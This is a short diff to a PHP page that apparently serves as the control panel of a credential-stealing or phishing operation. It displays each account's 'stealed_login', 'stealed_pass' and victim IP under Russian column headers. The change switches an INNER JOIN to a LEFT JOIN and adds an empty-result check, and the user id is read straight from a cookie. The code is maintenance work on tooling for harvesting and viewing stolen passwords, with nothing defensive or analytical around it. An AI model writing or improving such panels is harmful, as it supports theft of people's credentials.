@@ -10,7 +10,7 @@ elseif(isset($_COOKIE['id'])){
     $id = $_COOKIE['id'];
 }
 
-$stmt = Model::prepare("SELECT * FROM users INNER JOIN accounts ON users.id = accounts.user_id WHERE users.id = ?");
+$stmt = Model::prepare("SELECT * FROM users LEFT JOIN accounts ON users.id = accounts.user_id WHERE users.id = ?");
 
 $result = $stmt->execute([$id]);
 
@@ -36,12 +36,14 @@ $data = $stmt->fetchall(\PDO::FETCH_ASSOC);
             <td>Пароль</td>
             <td>IP</td>
         </tr>
-        <?php foreach($data as $d): ?>
-            <tr>
-                <td><?= $d['stealed_login'] ?></td>
-                <td><?= $d['stealed_pass'] ?></td>
-                <td><?= $d['ip'] ?></td>
+        <?php if(isset($data[0])): ?>
+            <?php foreach($data as $d): ?>
+                <tr>
+                    <td><?= $d['stealed_login'] ?></td>
+                    <td><?= $d['stealed_pass'] ?></td>
+                    <td><?= $d['ip'] ?></td>
             <?php endforeach; ?>
+        <?php endif; ?>
         </tr>
     </table>
 </body>
